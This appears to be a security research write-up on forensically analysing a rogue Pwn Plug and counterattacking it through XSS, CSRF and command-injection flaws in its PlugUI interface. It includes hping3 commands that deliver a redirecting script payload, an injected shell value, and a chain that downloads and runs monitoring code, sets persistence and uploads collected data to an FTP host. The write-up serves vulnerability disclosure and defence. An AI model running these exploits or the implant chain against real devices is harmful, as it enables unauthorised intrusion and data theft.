### Running the Command and Handling Errors

When executing the specified command, you may encounter "No such file or directory" errors. These errors are typically due to symbolic links that do not resolve correctly because the root of the filesystem is located in a subdirectory of your analysis system. These errors can be safely ignored, as the actual files are being compared recursively from the root of both extractions. The resulting text file will list files that differ between the two extractions, excluding special device files that are not relevant to your analysis. An example output comparing the commercial "Wireless" filesystem to the community edition is provided in the file `community_1.1_vs_wireless_1.1.txt`. This file serves to illustrate the format of the comparison output and provides guidance on the differences between the commercial and community versions for analysts without access to commercial Pwn Plug images.

### Analysis of Extracted Files

Once the files are extracted and compared, the analysis should be familiar to experienced Linux system analysts. Here are some key observations:

- **Hostname Configuration**: While the `/etc/hostname` in the downloaded images is set to "polonus5", the hostname of a recently purchased Pwn Plug was observed to be the MAC address of the unit, with no spaces or separators.
- **DHCP Leases**: Information on DHCP leases acquired on various interfaces may be found in `/var/lib/dhcp/dhclient.leases`, which can reveal details about the networks the device has been connected to.
- **Log Files**: `/var/log` contains a variety of log files typical of Linux systems, which may provide insights into the attacker's activities.
- **Web Interface Logs**: Logs of connections to the web-based interface (including IP addresses) for commercial versions of the Pwn Plug OS are stored in `/var/PwnPlug/plugui/webrick.log`.
- **Log Cleanup Script**: The web-based interface includes a button that launches a script to clean up log entries and command histories. This script, while useful for attackers to remove forensic artifacts, also serves as a reference for analysts to identify potential locations of such information when the device is seized.

### Vulnerability Analysis

Several vulnerabilities were discovered in the web interface (PlugUI) of commercial Pwn Plug systems, which operate by default. These vulnerabilities can be exploited to achieve complete, remote root compromise, as described in the "Counterattack Scenario and Toolkit" section.

#### Cross-Site Scripting (XSS)

Cross-Site Scripting (XSS) occurs when web applications display user-supplied data without proper filtering, allowing malicious scripts to run in the context of other users' browsers. In the PlugUI interface, the last ten lines of several log files are displayed. If the "Host:" or "User-Agent" fields of a sniffed HTTP request contain malicious scripting, JavaScript can be executed in the Pwn Plug owner's browser when they view the site. For example, the following script can be used to demonstrate XSS:

```javascript
alert("XSS Demo");
```

By crafting packets targeting the Pwn Plug with specific data, arbitrary scripts can be loaded into the Passive Recon page to execute in the owner's browser. The following command can be used to redirect the Pwn Plug owner to an attacker-controlled page:

```sh
hping3 -c 1 -p 80 -e ": GET\nHost: window.location.href=\"http://192.168.1.11:8000/exploit.html\";//\nUser-Agent: a\nReferer: a\nCookie: a"
```

Note that data sent to and logged by the Pwn Plug may not immediately appear in the web interface due to buffered I/O. To ensure the script is executed, it may be necessary to send duplicate packets at short intervals.

#### Cross-Site Request Forgery (CSRF)

Cross-Site Request Forgery (CSRF) vulnerabilities occur when web applications do not verify the origin of form submissions. In the PlugUI interface, none of the forms contain unique identifiers, and the targets of the forms do not verify the source of the data. This allows an attacker to use HTML and JavaScript to make changes to the Pwn Plug from any site the owner visits. This vulnerability is leveraged in the Counterattack Scenario & Toolkit section to exploit the following command injection vulnerability.

#### Command Injection

Command injection vulnerabilities arise when un-sanitized user input is passed into command-line arguments in the server-side of a web application. In the PlugUI, the "Reverse Shells" section contains form fields that pass unfiltered values to the command line. By manipulating these fields, an attacker can execute arbitrary commands. For example, changing a field to include `;touch /root/proof_of_concept;` can result in command execution, though it may take a moment due to the cron job that executes once per minute.

### Mitigation - Stealth Mode

The Pwn Plug documentation describes a "Stealth Mode" that disables all listening ports, including the SSH server and PlugUI web interface. This optional configuration closes the attack surface used by the identified vulnerabilities. However, an attacker might not enable "Stealth Mode" to maintain connectivity options. When "Stealth Mode" is active, counterattacking the device would still allow for more disruptive actions, such as rebooting and gaining access through the serial console.

### Counterattack Scenario & Toolkit

#### Introduction

It is possible to counterattack a Pwn Plug located within your organization. This scenario involves installing a monitoring program that periodically gathers data useful for attributing the Pwn Plug to its owner and identifying hosts, vulnerabilities, and data gathered by the device. Essentially, this turns the Pwn Plug into a honeypot that logs the actions of its owner.

#### Pre-Requisites

- The IP address of the Pwn Plug must be known.
- The PlugUI interface must be activated.
- The Passive Recon feature must be enabled, and the attacker must check the results in PlugUI.

#### Tools

- **exploit_packet_payload**: Payload for packets sent via `hping3`.
- **hping3**: Tool for crafting and sending arbitrary packets.
- **Web Server**: Any web server capable of hosting the files.
- **FTP Server**: FTP server set up with a limited account for incoming data transfers.
- **pwnmon (ubi.py)**: Honeypot/monitoring software written for this research.

#### Scenario

Given the pre-requisites, the `exploit_packet_payload` file contains code that will be rendered and executed in the "Passive Recon" section of the PlugUI interface. The file must be modified to include the URL where `ubi.py` is hosted. The following `hping3` command sends the payload to the Pwn Plug:

```sh
sudo hping3 192.168.9.10 -c 1 -p 80 -E exploit_packet_payload -d 1100
```

Once the Pwn Plug operator visits the "Passive Recon" page, the following chain of events occurs:

- A hidden version of the "Reverse Shells" form is loaded with crafted values.
- The form is submitted via the CSRF vulnerability, setting up commands in a cron job.
- The injected commands execute, downloading and running `ubi.py`.
- `ubi.py` cleans up after the exploit and installs itself as monitoring software.
- Every 10 minutes, data is collected and uploaded to the FTP server.
- A script is downloaded and run from a configurable web site for updates and additional features.

#### Honeypot/Monitoring Software - pwnmon

The `pwnmon` software monitors the Pwn Plug's actions and the data it collects. The following configuration options should be set before deployment:

- **ftp_host**: '192.168.9.187'
- **ftp_user**: 'pwnplug'
- **ftp_pass**: 'password'
- **remote_script**: 'http://192.168.9.187:8000/ubimount.py'
- **installed_location**: '/usr/sbin/ubifsck'
- **installed_name**: 'ubifsck'
- **lock_file**: '/usr/sbin/ubichksum'
- **collection_prefix**: 'pwnplug'
- **sleep_time**: 600

The software performs the following actions:

- Cleans up after the exploits.
- Disables the reverse SSH configuration.
- Installs itself and sets up persistence.
- Disables the bash history clearing feature.
- Every ten minutes, it runs a script from your website, gathers and uploads data to the FTP server.

#### Variations

- If the Pwn Plug owner can be convinced to visit a controlled web site, the XSS aspect can be skipped, and the web site can directly exploit the CSRF vulnerability.
- If the Pwn Plug's IP address is unknown, the attack can be adapted and repeated across a range of IP addresses.
- The default IP address of the Pwn Plug (192.168.9.10) can be used to compromise devices in their configuration/staging environments.

### Conclusions

This case study demonstrates that it is possible to forensically acquire and analyze a "rogue" Pwn Plug within an organization. Such devices can also be counter-attacked by leveraging vulnerabilities in their code. By turning attacker-implanted devices into monitoring and honeypot devices, we can gain valuable insights. Legitimate penetration testers should be aware that vulnerabilities in their tools can expose them and their clients to third-party attacks. Devices should be restored to a known-good configuration between tests and monitored for potential compromise. Penetration testers should have the necessary skills to protect themselves and their clients.